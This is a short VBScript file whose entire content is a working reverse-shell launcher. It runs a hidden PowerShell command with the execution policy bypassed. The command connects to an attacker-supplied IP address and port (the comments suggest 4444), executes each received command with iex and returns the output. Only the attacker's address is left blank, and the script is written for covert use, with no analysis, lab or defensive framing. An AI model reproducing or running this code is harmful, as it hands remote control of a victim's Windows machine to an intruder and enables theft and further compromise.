Option Explicit


Dim strHost, intPort
rem your device ip address goes here 
strHost = " "

rem put a port number for example: 4444 
intPort = 

Dim objShell
Set objShell = CreateObject("WScript.Shell")

Dim strCmd
strCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & strHost & "'," & intPort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"""

objShell.Run strCmd, 0, False
